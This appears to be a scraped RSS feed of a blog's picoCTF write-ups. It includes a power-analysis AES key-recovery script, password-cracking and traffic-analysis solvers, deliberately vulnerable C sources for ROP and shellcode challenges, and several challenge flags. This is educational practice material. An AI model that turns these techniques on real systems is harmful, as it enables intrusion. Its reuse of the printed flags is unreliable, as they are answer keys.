Patter, Platters
Background sda
Source code Exploit - Use FTK Imager I use Autopsy but find nothing except a txt file So I follow write up video to use FTK imager and it can parse files completely. ORRRR…
Use HxD as auxiliary tool to find flag ORRRR…</description></item><item><title>PicoCTF - PowerAnalysis Part 1 / Part 2</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/index.html</guid><description>PicoCTF - PowerAnalysis Part 1 / Part 2 Background Simple Welcome 0x13(2023 HW - Power Analysis):two:
Recon 這一題幾乎就和上課教的差不多，只是因為有雜訊，所以要慎選trace point，我是直接看第一個trace的分布，決定採用300~400的point，而不管是利用自己刻的correlation coefficient還是用scipy的pearsonr都一樣可以順利解出key但是如果像homework一樣用numpy的corrcoef會有兩個bytes和正解不一樣，超哭，找超久(10/18更新，如果用自己刻的也是要碰用氣，所以如果可以的話，多送幾個trace，或者多用幾個算correlation coefficient的library) Part 2的部分幾乎一模一樣，就只是他先幫你紀錄好所有的trace，再讓我們做後續的分析 Exploit 首先先把資料從server拉下來，在存成json from pwn import * from string import ascii_letters, digits import json from tqdm import trange def gen_plaintext(length): return ''.join(random.choice(ascii_letters + digits) for _ in range(length)) pt = [gen_plaintext(16) for _ in range(50)] print(pt) json_file = [None] * len(pt) for i in trange(len(pt)): r = remote('saturn.picoctf.net', 52339) r.sendlineafter(b'hex: ', pt[i].encode('utf-8').hex().encode()) r.recvuntil(b'power measurement result: ') pm = r.recvline().decode().strip() json_file[i] = {} json_file[i]["pt"] = [ord(digit) for digit in pt[i]] json_file[i]["pm"] = pm r.close() json_object = json.dumps(json_file) with open("./Crypto/PowerAnalysis- Part 1/trace.json", 'w') as outfile: outfile.write(json_object) 然後再去解析AES key import json from tqdm import trange import numpy as np import copy from string import ascii_letters, digits from numpy import corrcoef import matplotlib.pyplot as plt from scipy.stats import pearsonr jsonFile = open('./PicoCTF/Crypto/PowerAnalysis- Part 1/trace.json', 'r') j = json.load(jsonFile) s_box = [ [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76], [0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0], [0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15], [0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75], [0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84], [0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF], [0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8], [0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2], [0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73], [0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB], [0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79], [0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08], [0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A], [0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E], [0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF], [0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16] ] def data_preprocess(json_data): pt_col = [] # ct_col = [] trace_col = [] for bytes in range(16): tmp_pt_col = [] # tmp_ct_col = [] for trace_idx in range(len(json_data)): tmp_pt_col.append(json_data[trace_idx]['pt'][bytes]) # tmp_ct_col.append(json_data[trace_idx]['ct'][bytes]) pt_col.append(tmp_pt_col) # ct_col.append(tmp_ct_col) for point in range(300, 400):#len(json_data[0]['pm']) tmp_trace_col = [] for trace_idx in range(len(json_data)): tmp_trace_col.append(json_data[trace_idx]['pm'][point]) trace_col.append(tmp_trace_col) return pt_col, trace_col def sbox_preprocess(pt_col): sbox_result_tmp = [] for sbox_key in range(256): # 總共有256個sbox key tmp = [] for trace in range(len(pt_col)): # 有50個trace tmp.append(pt_col[trace] ^ sbox_key) sbox_result_tmp.append(tmp) return sbox_result_tmp def choose_sbox(sbox_result_tmp): sbox_result = copy.deepcopy(sbox_result_tmp) for sbox_key in range(256): for trace in range(50): hex_value = '{0:0>2x}'.format(sbox_result_tmp[sbox_key][trace]) x, y = hex_value[0], hex_value[1] sbox_result[sbox_key][trace] = s_box[int(x, 16)][int(y, 16)] return sbox_result def cal_hamming_weight(sbox_result_col): hw_model = copy.deepcopy(sbox_result_col) for i in range(len(sbox_result_col)): # 256 for j in range(len(sbox_result_col[i])): # 50 hw_model[i][j] = bin(sbox_result_col[i][j]).count('1') return hw_model def cal_correlation(hw_model_col_result, trace_col): correlation_result = [] for i in trange(len(hw_model_col_result)):#(ascii_letters + digits).encode(): for j in range(biggest_length):#len(trace_col) # correlation_result.append(corrcoef(hw_model_col_result[i], trace_col[j])[0, -1]) # correlation_result.append(pearsonr(hw_model_col_result[i], trace_col[j])[0]) correlation_result.append(run_pearson_correlation(hw_model_col_result[i], trace_col[j])) return correlation_result def run_pearson_correlation(x, y): mean_x = np.mean(x) mean_y = np.mean(y) covariance = np.sum((x - mean_x) * (y - mean_y)) std_dev_x = np.sqrt(np.sum((x - mean_x)**2)) std_dev_y = np.sqrt(np.sum((y - mean_y)**2)) correlation = covariance / (std_dev_x * std_dev_y) return correlation def display_pt(offset:int, data_offset = (0, len(j[0]["pm"]))): plt.plot(range(data_offset[0], data_offset[1]), j[offset]["pm"][data_offset[0]:data_offset[1]]) plt.savefig(fname="./PicoCTF/Crypto/PowerAnalysis- Part 1/pt_" + str(offset) + ".jpg") plt.clf() # display_pt(1, (0, 700)) # display_pt(1) pt_col, trace_col = data_preprocess(j) flag = '' biggest_length = 100#len(trace_col) for idx in trange(16): sbox_preprocess_result = sbox_preprocess(pt_col[idx]) choose_sbox_result = choose_sbox(sbox_preprocess_result) hw_model_col_result = cal_hamming_weight(choose_sbox_result) correlation_result = cal_correlation(hw_model_col_result, trace_col) key_idx = correlation_result.index(max(correlation_result)) # flag += (ascii_letters + digits)[key_idx // biggest_length] from Crypto.Util.number import long_to_bytes flag += long_to_bytes(key_idx // biggest_length).hex() print('The key of AES is: ' + flag ) Flag: picoCTF{4999139026d84bf20427eb48d4edec53}</description></item><item><title>PicoCTF - Powershelly</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---powershelly/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---powershelly/index.html</guid><description>PicoCTF - Powershelly Background Powershell 命令提示字元比較 What is ‘@{}’ meaning in PowerShell What does @() mean in Powershell? [Python] 學習使用集合 (Set)
Source code :::spoiler Source Code
$input = ".\input.txt" $out = Get-Content -Path $input $enc = [System.IO.File]::ReadAllBytes("$input") $encoding = [system.Text.Encoding]::UTF8 $total = 264 $t = ($total + 1) * 5 #1325 $numLength = ($total * 30 ) + $t # 9245 if ($out.Length -gt 5 -or $enc.count -ne $numLength) { Write-Output "Wrong format 5" Exit } else { for($i=0; $i -lt $enc.count ; $i++) { if (($enc[$i] -ne 49) -and ($enc[$i] -ne 48) -and ($enc[$i] -ne 10) -and ($enc[$i] -ne 13) -and ($enc[$i] -ne 32)) { Write-Output "Wrong format 1/0/" Exit } } } $blocks = @{} for ($i=0; $i -lt $out.Length ; $i++) { $r = $out[$i].Split(" ") if ($i -gt 0) { for ($j=0; $j -lt $r.Length ; $j++) { if ($r[$j].Length -ne 6) { Write-Output "Wrong Format 6" $r[$j].Length Exit } $blocks[$j] += $r[$j] } } else { for ($j=0; $j -lt $r.Length ; $j++) { if ($r[$j].Length -ne 6) { Write-Output "Wrong Format 6" $r[$j].Length Exit } $blocks[$j] = @() $blocks[$j] += $r[$j] } } } function Exit { exit } function Random-Gen { $list1 = @() for ($i=1; $i -lt ($blocks.count + 1); $i++) { $y = ((($i * 327) % 681 ) + 344) % 313 $list1 += $y } return $list1 } function Scramble { param ( $block, $seed ) $raw = [system.String]::Join("", $block) $bm = "10 " * $raw.Length $bm = $bm.Split(" ") for ($i=0; $i -lt $raw.Length ; $i++) { $y = ($i * $seed) % $raw.Length $n = $bm[$y] while ($n -ne "10") { $y = ($y + 1) % $raw.Length $n = $bm[$y] } if ($raw[$i] -eq "1" ) { $n = "11" } else { $n = "00" } $bm[$y] = $n } $raw2 = [system.String]::Join("", $bm) $b = [convert]::ToInt64($raw2,2) return $b } $result = 0 $seeds = @() for ($i=1; $i -lt ($blocks.count +1); $i++) { $seeds += ($i * 127) % 500 } $randoms = Random-Gen $output_file = @() for ($i=0; $i -lt $blocks.count ; $i++) { $fun = Scramble -block $blocks[$i] -seed $seeds[$i] if($i -eq 263) { Write-Output $seeds[$i] Write-Output $randoms[$i] Write-Output $fun } $result = $fun -bxor $result -bxor $randoms[$i] $output_file += $result } Add-Content -Path output_test.txt -Value $output_file :::</description></item><item><title>PicoCTF - PW Crack 4</title><link>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---pw-crack-4/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---pw-crack-4/index.html</guid><description>PicoCTF - PW Crack 4 tags: PicoCTF CTF General Skills Challenge: PW Crack 4
Source code :::spoiler source code
import hashlib ### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ######################## def str_xor(secret, key): #extend key to secret length new_key = key i = 0 while len(new_key) &lt; len(secret): new_key = new_key + key[i] i = (i + 1) % len(key) return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)]) ############################################################################### flag_enc = open('level4.flag.txt.enc', 'rb').read() correct_pw_hash = open('level4.hash.bin', 'rb').read() def hash_pw(pw_str): pw_bytes = bytearray() pw_bytes.extend(pw_str.encode()) m = hashlib.md5() m.update(pw_bytes) return m.digest() def level_4_pw_check(): user_pw = input("Please enter correct password for flag: ") user_pw_hash = hash_pw(user_pw) if( user_pw_hash == correct_pw_hash ): print("Welcome back... your flag, user:") decryption = str_xor(flag_enc.decode(), user_pw) print(decryption) return print("That password is incorrect") level_4_pw_check() # The strings below are 100 possibilities for the correct password. # (Only 1 is correct) pos_pw_list = ["6288", "6152", "4c7a", "b722", "9a6e", "6717", "4389", "1a28", "37ac", "de4f", "eb28", "351b", "3d58", "948b", "231b", "973a", "a087", "384a", "6d3c", "9065", "725c", "fd60", "4d4f", "6a60", "7213", "93e6", "8c54", "537d", "a1da", "c718", "9de8", "ebe3", "f1c5", "a0bf", "ccab", "4938", "8f97", "3327", "8029", "41f2", "a04f", "c7f9", "b453", "90a5", "25dc", "26b0", "cb42", "de89", "2451", "1dd3", "7f2c", "8919", "f3a9", "b88f", "eaa8", "776a", "6236", "98f5", "492b", "507d", "18e8", "cfb5", "76fd", "6017", "30de", "bbae", "354e", "4013", "3153", "e9cc", "cba9", "25ea", "c06c", "a166", "faf1", "2264", "2179", "cf30", "4b47", "3446", "b213", "88a3", "6253", "db88", "c38c", "a48c", "3e4f", "7208", "9dcb", "fc77", "e2cf", "8552", "f6f8", "7079", "42ef", "391e", "8a6d", "2154", "d964", "49ec"] :::</description></item><item><title>PicoCTF - ropfu</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---ropfu/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---ropfu/index.html</guid><description>PicoCTF - ropfu Background ROP Chain x86 Calling Convention: Linux System Call Table
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #define BUFSIZE 16 void vuln() { char buf[16]; printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n"); return gets(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); } :::</description></item><item><title>PicoCTF - RPS</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---rps/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---rps/index.html</guid><description>PicoCTF - RPS Background strstr() in C/C++
In C++, std::strstr() is a predefined function used for string handling. string.h is the header file required for string functions. This function takes two strings s1 and s2 as an argument and finds the first occurrence of the sub-string s2 in the string s1. The process of matching does not include the terminating null-characters(‘\0’), but function stops there. Syntax:
char *strstr (const char *s1, const char *s2); Parameters: s1: This is the main string to be examined. s2: This is the sub-string to be searched in s1 string. Return Value: This function returns a pointer points to the first character of the found s2 in s1 otherwise a null pointer if s2 is not present in s1. If s2 points to an empty string, s1 is returned.</description></item><item><title>PicoCTF - SaaS</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---saas/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---saas/index.html</guid><description>PicoCTF - SaaS Background seccomp-tool
Source code :::spoiler Source Code
#include &lt;errno.h> #include &lt;error.h> #include &lt;fcntl.h> #include &lt;seccomp.h> #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;sys/mman.h> #include &lt;sys/syscall.h> #include &lt;unistd.h> #define SIZE 0x100 // http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&amp;arch=x86-64&amp;as_format=inline#assembly #define HEADER "\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff" #define FLAG_SIZE 64 char flag[FLAG_SIZE]; void load_flag() { int fd; if ((fd = open("flag.txt", O_RDONLY)) == -1) error(EXIT_FAILURE, errno, "open flag"); if (read(fd, flag, FLAG_SIZE) == -1) error(EXIT_FAILURE, errno, "read flag"); if (close(fd) == -1) error(EXIT_FAILURE, errno, "close flag"); } void setup() { scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_KILL); int ret = 0; if (ctx != NULL) { ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1, SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO)); ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); ret |= seccomp_load(ctx); } seccomp_release(ctx); if (ctx == NULL || ret) error(EXIT_FAILURE, 0, "seccomp"); } int main() { setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); load_flag(); puts("Welcome to Shellcode as a Service!"); void* addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); memcpy(addr, HEADER, sizeof(HEADER)); read(0, addr + sizeof(HEADER) - 1, SIZE); setup(); goto *addr; } :::</description></item><item><title>PicoCTF - Scavenger Hunt</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---scavenger-hunt/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---scavenger-hunt/index.html</guid><description>PicoCTF - Scavenger Hunt tags: PicoCTF CTF Web Challenge: Scavenger Hunt
Background .htaccess 使用技巧彙整
.htaccess文件(或者」分佈式配置文件」）提供了針對目錄改變配置的方法， 即，在一個特定的文件目錄中放置一個包含一個或多個指令的文件， 以作用於此目錄及其所有子目錄。作為用戶，所能使用的命令受到限制。管理員可以通過Apache的AllowOverride指令來設置。 概述來說，htaccess文件是Apache伺服器中的一個配置文件，它負責相關目錄下的網頁配置。通過htaccess文件，可以幫我們實現：網頁301重定向、自定義404錯誤頁面、改變文件擴展名、允許/阻止特定的用戶或者目錄的訪問、禁止目錄列表、配置預設文件等功能。 .htaccess 詳解
Exploit - Insp3ct0r + htaccess + DS_Store HTML + CSS +JS These files keeps one fragment flag each. Especially js file’s hint: /* How can I keep Google from indexing my website? */ Apache server $\to$ .htaccess file</description></item><item><title>PicoCTF - scrambled-bytes</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/index.html</guid><description>PicoCTF - scrambled-bytes Background 盤點一款 Python 發包收包利器 - scapy
只發不收 send(pkt, inter=0, loop=0, count=1, iface=N) pkt:數據包 inter：發包間隔時間 count：發包數量 iface：網卡接口名稱 send()，在第三層發包，沒有接收功能；send(IP(dst="www.baidu.com",ttl=2)/ICMP()) sendp()，在第二層發包，沒有接收功能。sr(Ether()/IP(dst="www.baidu.com")) time-時間的訪問和轉換 python 的pyshark庫如何使用 PyShark入門(2)：FileCapture和LiveCapture模塊
Source code :::spoiler Source Code
#!/usr/bin/env python3 import argparse from progress.bar import IncrementalBar from scapy.all import * import ipaddress import random from time import time def check_ip(ip): try: return ipaddress.ip_address(ip) except: raise argparse.ArgumentTypeError(f'{ip} is an invalid address') def check_port(port): try: port = int(port) if port &lt; 1 or port > 65535: raise ValueError return port except: raise argparse.ArgumentTypeError(f'{port} is an invalid port') def main(args): with open(args.input, 'rb') as f: payload = bytearray(f.read()) random.seed(int(time())) random.shuffle(payload) with IncrementalBar('Sending', max=len(payload)) as bar: for b in payload: send( IP(dst=str(args.destination)) / UDP(sport=random.randrange(65536), dport=args.port) / Raw(load=bytes([b^random.randrange(256)])), verbose=False) bar.next() if __name__=='__main__': parser = argparse.ArgumentParser() parser.add_argument('destination', help='destination IP address', type=check_ip) parser.add_argument('port', help='destination port number', type=check_port) parser.add_argument('input', help='input file') main(parser.parse_args()) :::</description></item><item><title>PicoCTF - Scrambled: RSA</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/index.html</guid><description>PicoCTF - Scrambled: RSA tags: PicoCTF CTF Crypto Hint Look at the ciphertext, anything fishy, maybe a little bit long? What happens if you encrypt the same input multiple times? Is RSA deterministic, why would outputs vary? Recon - 通靈 這一題也是頗有趣但要通靈，可以先亂Try
$ nc mercury.picoctf.net 61477 flag = ... I will encrypt whatever you give me: b Here you go: 26990049735578409030682378965549085676344091481060419655306695078226500400679435180914414853843456517959269938025436462371813167477339887511293320498195667717320879617653974074204687042294887795784122711621510485951142842770951325298677811102706200275406899117894241145575602912451443892687252208402011904237 I will encrypt whatever you give me: ba Here you go: 2699004973557840903068237896554908567634409148106041965530669507822650040067943518091441485384345651795926993802543646237181316747733988751129332049819566771732087961765397407420468704229488779578412271162151048595114284277095132529867781110270620027540689911789424114557560291245144389268725220840201190423748281433709412944662646587136176334777506529508638551296181668932027523016538393747587852449462326357575277427356480410273494280971757044562513629423400967407332448126388859817313684399195291279961899276921240210270110225654310423792352532266414306766344869066386142998118001891330035563388790707576505068944 I will encrypt whatever you give me: bac Here you go: 482814337094129446626465871361763347775065295086385512961816689320275230165383937475878524494623263575752774273564804102734942809717570445625136294234009674073324481263888598173136843991952912799618992769212402102701102256543104237923525322664143067663448690663861429981180018913300355633887907075765050689449619429085627210113794723864117161956939961066630142420889676674025917593454737310140819887001206562193281145515990410131903949359211712425034234736366286462137700473579439657314154736719868903719111785858132034797052503447042089004862886989401543635700329455353580959453911569277021402998961166474045310601826990049735578409030682378965549085676344091481060419655306695078226500400679435180914414853843456517959269938025436462371813167477339887511293320498195667717320879617653974074204687042294887795784122711621510485951142842770951325298677811102706200275406899117894241145575602912451443892687252208402011904237 ... 一開始加密的b是269900...904237，第二個加密的ba是26990...5068944，但如果仔細看其實第一個加密的密文其實也存在其中，他其實是269900...904237+482814...5068944，可以加密第三個bac試看看，也會發現是482814...5068944+961942...3106018+269900...904237 所以我們可以再往這個方向測試一下，我們知道一開始的flag一定是picoCTF{，我們加密p會發現密文其實存在原始的flag密文當中，因此我們可以寫一個腳本，像上一題一樣暴力破解，如果加密的密文有存在原本的flag ciphertext中的話，就代表我們猜對了，反之就繼續找</description></item><item><title>PicoCTF - Secrets</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---secrets/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---secrets/index.html</guid><description>PicoCTF - Secrets tags: PicoCTF CTF Web Recon Description: We have several pages hidden. Can you find the one with the flag? Hint: folders folders folders 這一題也是蠻有趣的
Exploit - 通靈 首先看一下網頁的source code，沒什麼特別的地方，但有看到secret/assets/index.css，所以有一個route是secrets，試看看有甚麼東西 發現這樣的想法是對的，陸續看一下source code有甚麼其他route，就繼續加在URL就對了 Payload: view-source:http://saturn.picoctf.net:65352/secret/hidden/superhidden/ Flag: picoCTF{succ3ss_@h3n1c@10n_790d2615}
Reference secrets | picoCTF 2022</description></item><item><title>PicoCTF - seed-sPRiNG</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---seed-spring/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---seed-spring/index.html</guid><description>PicoCTF - seed-sPRiNG Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { int guess_height; // [esp+0h] [ebp-18h] BYREF int ans; // [esp+4h] [ebp-14h] unsigned int seed; // [esp+8h] [ebp-10h] int i; // [esp+Ch] [ebp-Ch] int *p_argc; // [esp+10h] [ebp-8h] p_argc = &amp;argc; puts(&amp;unk_A50); puts(&amp;unk_A50); puts(" "); puts(" # mmmmm mmmmm \" mm m mmm "); puts(" mmm mmm mmm mmm# mmm # \"# # \"# mmm #\"m # m\" \""); puts(" # \" #\" # #\" # #\" \"# # \" #mmm#\" #mmmm\" # # #m # # mm"); puts(" \"\"\"m #\"\"\"\" #\"\"\"\" # # \"\"\"m # # \"m # # # # # #"); puts(" \"mmm\" \"#mm\" \"#mm\" \"#m## \"mmm\" # # \" mm#mm # ## \"mmm\""); puts(" "); puts(&amp;unk_A50); puts(&amp;unk_A50); puts("Welcome! The game is easy: you jump on a sPRiNG."); puts("How high will you fly?"); puts(&amp;unk_A50); fflush(stdout); seed = time(0); srand(seed); for ( i = 1; i &lt;= 30; ++i ) { printf("LEVEL (%d/30)\n", i); puts(&amp;unk_A50); LOBYTE(ans) = rand() &amp; 0xF; ans = ans; printf("Guess the height: "); fflush(stdout); __isoc99_scanf("%d", &amp;guess_height); fflush(stdin); if ( ans != guess_height ) { puts("WRONG! Sorry, better luck next time!"); fflush(stdout); exit(-1); } } puts("Congratulation! You've won! Here is your flag:\n"); fflush(stdout); get_flag(); fflush(stdout); return 0; } :::</description></item><item><title>PicoCTF - Sequences</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---sequences/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---sequences/index.html</guid><description>PicoCTF - Sequences Source code :::spoiler Source Code
import math import hashlib import sys from tqdm import tqdm import functools ITERS = int(2e7) VERIF_KEY = "96cc5f3b460732b442814fd33cf8537c" ENCRYPTED_FLAG = bytes.fromhex("42cbbce1487b443de1acf4834baed794f4bbd0dfe2d6046e248ff7962b") # This will overflow the stack, it will need to be significantly optimized in order to get the answer :) @functools.cache def m_func(i): if i == 0: return 1 if i == 1: return 2 if i == 2: return 3 if i == 3: return 4 return 55692*m_func(i-4) - 9549*m_func(i-3) + 301*m_func(i-2) + 21*m_func(i-1) # Decrypt the flag def decrypt_flag(sol): sol = sol % (10**10000) sol = str(sol) sol_md5 = hashlib.md5(sol.encode()).hexdigest() if sol_md5 != VERIF_KEY: print("Incorrect solution") sys.exit(1) key = hashlib.sha256(sol.encode()).digest() flag = bytearray([char ^ key[i] for i, char in enumerate(ENCRYPTED_FLAG)]).decode() print(flag) if __name__ == "__main__": sol = m_func(ITERS) decrypt_flag(sol) :::</description></item><item><title>PicoCTF - shark on wire 1</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/index.html</guid><description>PicoCTF - shark on wire 1 tags: PicoCTF CTF Misc Challenge: shark on wire 1
Exploit - Analyze UDP stream It transfer the single character by UDP protocol. Follow the UDP stream and you’ll get the flag</description></item><item><title>PicoCTF - shark on wire 2</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/index.html</guid><description>PicoCTF - shark on wire 2 Recon 這一提出的很硬要，誰知道會把flag藏在這種地方，也沒有任何的提示，如果不是看1根本不知道這題要表達甚麼，也可能是我太蔡
Simple Recon 首先做一些基本的recon，諸如dump files/string search/follow tcp or udp之類的，會發現UDP packets會有一些訊息出現，其中出現Start和一些a/b最後接著end Set filter as udp.port==22 會發現其中所有的len都一樣，就只有source port不一樣，同樣都是5xxx開頭，而後三位數就是flag Extract Flag 所以只要把所有的port擷取出來拚在一起，就可以拿到flag了 Exploit import pyshark capture = pyshark.FileCapture('./PicoCTF/Misc/shark on wire 2/capture.pcap', display_filter='udp.port == 22') data = [] for pkt in capture: if pkt.udp.port != '5000': data.append(chr(int(pkt.udp.port[1:]))) print("".join(data)) Flag: picoCTF{p1LLf3r3d_data_v1a_st3g0}</description></item><item><title>PicoCTF - SideChannel</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---sidechannel/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---sidechannel/index.html</guid><description>PicoCTF - SideChannel Description There’s something fishy about this PIN-code checker, can you figure out the PIN and get the flag? Download the PIN checker program here pin_checker Once you’ve figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 50364 and provide it the PIN to get your flag.
